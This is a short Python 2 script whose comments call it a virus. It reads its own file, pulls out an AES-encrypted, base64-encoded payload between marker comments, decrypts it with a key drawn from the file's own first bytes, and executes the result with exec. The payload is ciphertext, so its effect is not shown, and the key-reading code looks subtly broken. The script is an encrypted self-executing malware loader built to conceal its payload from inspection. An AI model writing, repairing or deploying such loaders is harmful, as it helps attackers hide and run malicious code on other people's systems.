print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"

######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)
   
   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Uncrypted
# Start payload
#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
# End payload